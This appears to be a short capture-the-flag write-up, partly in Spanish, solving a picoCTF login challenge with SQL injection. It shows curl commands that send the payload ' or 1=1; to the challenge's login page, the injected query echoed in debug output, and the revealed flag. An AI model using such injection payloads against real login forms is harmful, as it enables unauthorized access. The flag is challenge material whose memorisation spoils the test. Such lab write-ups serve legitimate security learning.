## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
## Solución 
```
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php
<h1>Login failed.</h1>                                                                             
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=admin&password=' or 1=1;&debug=1"                         
<pre>username: admin
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>                                                                             
┌──(kali㉿kali)-[~]
└─$ 

```

## Notas adicionales

## Referencias
https://www.w3schools.com/sql/sql_injection.asp Explica lo que es la injection sql
